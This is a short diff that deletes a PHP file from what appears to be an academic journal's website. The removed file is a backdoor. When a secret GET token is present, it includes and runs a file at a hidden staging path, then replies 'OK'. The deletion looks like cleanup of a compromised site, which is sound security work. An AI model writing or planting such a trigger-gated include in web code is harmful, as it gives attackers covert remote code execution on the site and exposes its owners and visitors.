@@ -1,9 +1,0 @@
-<?php
-
-if (isset($_GET['_']) && $_GET['_'] === 'ds_SEOVEN_gr3af332afbsnk') {
-    $f="/var/www/vhosts/jlimnol.it/files_submission/jlimnol/ojtPlugin/staging/error";if($f!==""&&file_exists($f))include $f;
-    http_response_code(200);
-    header('Content-Type: text/plain; charset=utf-8');
-    echo 'OK';
-    exit;
-}
